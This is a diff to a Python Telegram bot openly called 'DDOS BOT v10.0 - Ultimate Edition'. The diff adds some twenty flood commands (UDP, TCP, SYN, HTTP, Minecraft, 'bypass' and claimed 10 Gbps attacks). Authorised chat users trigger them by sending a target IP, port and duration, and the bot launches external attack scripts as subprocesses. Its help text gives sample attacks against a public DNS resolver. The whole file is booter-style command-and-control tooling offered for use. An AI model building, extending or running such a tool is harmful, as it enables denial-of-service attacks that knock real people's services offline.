@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """
-💀 DDOS BOT v10.0 - SCRIPT BASED 💀
+💀 DDOS BOT v10.0 - ULTIMATE EDITION 💀
+All attack methods included - 10 Gbps+ Ready
 """
 
 import telebot
@@ -28,17 +29,37 @@ BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
 # ========== ATTACK SCRIPT MAP ==========
 ATTACK_SCRIPTS = {
+    # Basic attacks
     'udp': (os.path.join(BASE_DIR, "udp.py"), 500),
     'tcp': (os.path.join(BASE_DIR, "tcp.py"), 300),
     'syn': (os.path.join(BASE_DIR, "syn.py"), 300),
     'httpflood': (os.path.join(BASE_DIR, "httpflood.py"), 200),
+    
+    # Monster attacks
     'tudp': (os.path.join(BASE_DIR, "tudp.py"), 1500),
     'mc': (os.path.join(BASE_DIR, "mc.py"), 1000),
     'mcquery': (os.path.join(BASE_DIR, "mcquery.py"), 800),
     'mchandshake': (os.path.join(BASE_DIR, "mchandshake.py"), 600),
+    
+    # Bypass attacks
     'udpbypass': (os.path.join(BASE_DIR, "udpbypass.py"), 1200),
     'tcpbypass': (os.path.join(BASE_DIR, "tcpbypass.py"), 800),
     'gudp': (os.path.join(BASE_DIR, "gudp.py"), 1500),
+    
+    # 10 Gbps attacks
+    'ultra': (os.path.join(BASE_DIR, "ultra.py"), 2000),
+    'mega': (os.path.join(BASE_DIR, "megabot.py"), 1500),
+    'nuclear': (os.path.join(BASE_DIR, "nuclear.py"), 2000),
+    '10gbps': (os.path.join(BASE_DIR, "10gbps.py"), 3000),
+    'maxpower': (os.path.join(BASE_DIR, "maxpower.py"), 2500),
+    
+    # 10 Gbps Bypass
+    'udpbypass10g': (os.path.join(BASE_DIR, "udpbypass10g.py"), 3000),
+    'tcpbypass10g': (os.path.join(BASE_DIR, "tcpbypass10g.py"), 2500),
+    
+    # C-based converted attacks
+    'killall': (os.path.join(BASE_DIR, "killall.py"), 2000),
+    'udppps': (os.path.join(BASE_DIR, "udp-pps.py"), 3000),
 }
 
 # ========== FUNCTIONS ==========
@@ -196,51 +217,93 @@ def stop_all_attacks():
 
 @bot.message_handler(commands=['start'])
 def start_command(message):
-    bot.reply_to(message, """💀 DDOS BOT v10.0 💀
+    bot.reply_to(message, """💀 DDOS BOT v10.0 - ULTIMATE EDITION 💀
 
-🔥 ATTACKS:
+🔥 BASIC ATTACKS:
 /udp <target> <port> <time> - UDP Flood
 /tcp <target> <port> <time> - TCP Flood
 /syn <target> <port> <time> - SYN Flood
 /httpflood <target> <port> <time> - HTTP Flood
+
+🔥 MONSTER ATTACKS:
 /tudp <target> <port> <time> - TUDP Monster
 /mc <target> <port> <time> - Minecraft Attack
 /mcquery <target> <port> <time> - Minecraft Query
 /mchandshake <target> <port> <time> - Minecraft Handshake
+
+🔥 BYPASS ATTACKS:
 /udpbypass <target> <port> <time> - UDP Bypass
 /tcpbypass <target> <port> <time> - TCP Bypass
 /gudp <target> <port> <time> - GUDP Flood
 
+🔥 10 GBPS ATTACKS:
+/ultra <target> <port> <time> - 2-5 Gbps
+/mega <target> <port> <time> - 3-8 Gbps
+/nuclear <target> <port> <time> - 5-10 Gbps
+/10gbps <target> <port> <time> - 10 Gbps Guaranteed
+/maxpower <target> <port> <time> - 10+ Gbps
+
+🔥 10 GBPS BYPASS:
+/udpbypass10g <target> <port> <time> - UDP Bypass 10G
+/tcpbypass10g <target> <port> <time> - TCP Bypass 10G
+
+🔥 C-BASED CONVERTED:
+/killall <target> <port> <time> - TCP Amplification
+/udppps <target> <port> <time> - UDP PPS Flood
+
 🛑 CONTROL:
-/stopall - Stop attacks
+/stopall - Stop your attacks
 /status - Check attacks
 /id - Get your ID
 /check - Check attack status
 
-Example: /udp 8.8.8.8 53 10
-Duration: 1-600 seconds""")
+👑 Admin:
+/globalstop - Stop ALL attacks
+
+Example: /10gbps 8.8.8.8 53 10""")
 
 @bot.message_handler(commands=['help'])
 def help_command(message):
-    bot.reply_to(message, """💀 COMMANDS 💀
+    bot.reply_to(message, """💀 ALL COMMANDS 💀
 
+BASIC:
 /udp 1.2.3.4 80 60
 /tcp 1.2.3.4 80 60
 /syn 1.2.3.4 80 60
 /httpflood 1.2.3.4 80 60
+
+MONSTER:
 /tudp 1.2.3.4 80 60
 /mc 1.2.3.4 25565 60
 /mcquery 1.2.3.4 25565 60
 /mchandshake 1.2.3.4 25565 60
+
+BYPASS:
 /udpbypass 1.2.3.4 80 60
 /tcpbypass 1.2.3.4 80 60
 /gudp 1.2.3.4 80 60
 
+10 GBPS:
+/ultra 1.2.3.4 80 60
+/mega 1.2.3.4 80 60
+/nuclear 1.2.3.4 80 60
+/10gbps 1.2.3.4 80 60
+/maxpower 1.2.3.4 80 60
+
+10 GBPS BYPASS:
+/udpbypass10g 1.2.3.4 80 60
+/tcpbypass10g 1.2.3.4 80 60
+
+C-BASED:
+/killall 1.2.3.4 80 60
+/udppps 1.2.3.4 80 60
+
+CONTROL:
 /stopall - Stop attacks
 /status - Check attacks
 /id - Get your ID
 /check - Check attack status
-/admin - Admin panel""")
+/globalstop - Stop ALL (Admin)""")
 
 @bot.message_handler(commands=['id'])
 def id_command(message):
@@ -292,14 +355,12 @@ def check_command(message):
         bot.reply_to(message, "❌ Not authorized")
         return
     
-    # Check for any running attack processes
     result = subprocess.getoutput("ps aux | grep -E 'attack_.*\\.py' | grep -v grep | grep -v bot.py")
     if result:
         response = f"🟢 ATTACK RUNNING!\n\n```\n{result[:400]}\n```"
     else:
         response = "🔴 No attack running"
     
-    # Also check temp files
     files = subprocess.getoutput("ls -la /tmp/attack_*.py 2>/dev/null")
     if files and "No such file" not in files:
         response += f"\n\n📁 Temp files:\n```\n{files[:200]}\n```"
@@ -406,7 +467,15 @@ def make_handler(attack_type):
     return handler
 
 # Register all attacks
-attacks = ['udp', 'tcp', 'syn', 'httpflood', 'tudp', 'mc', 'mcquery', 'mchandshake', 'udpbypass', 'tcpbypass', 'gudp']
+attacks = [
+    'udp', 'tcp', 'syn', 'httpflood', 
+    'tudp', 'mc', 'mcquery', 'mchandshake',
+    'udpbypass', 'tcpbypass', 'gudp',
+    'ultra', 'mega', 'nuclear', '10gbps', 'maxpower',
+    'udpbypass10g', 'tcpbypass10g',
+    'killall', 'udppps'
+]
+
 for attack in attacks:
     handler = make_handler(attack)
     handler.__name__ = f"handle_{attack}"
@@ -416,9 +485,9 @@ for attack in attacks:
 # ========== MAIN ==========
 
 if __name__ == "__main__":
-    print("=" * 50)
-    print("💀 DDOS BOT v10.0 - SCRIPT BASED 💀")
-    print("=" * 50)
+    print("=" * 60)
+    print("💀 DDOS BOT v10.0 - ULTIMATE EDITION 💀")
+    print("=" * 60)
     
     # Install psutil if not installed
     try:
@@ -437,6 +506,6 @@ if __name__ == "__main__":
     print(f"[+] Loaded {len(allowed_users)} users")
     print(f"[+] Admin IDs: {ADMIN_IDS}")
     print(f"[+] Attack scripts: {len(ATTACK_SCRIPTS)}")
-    print("=" * 50)
+    print("=" * 60)
     print("[+] Bot running! Press Ctrl+C to stop.")
     bot.polling(none_stop=True)
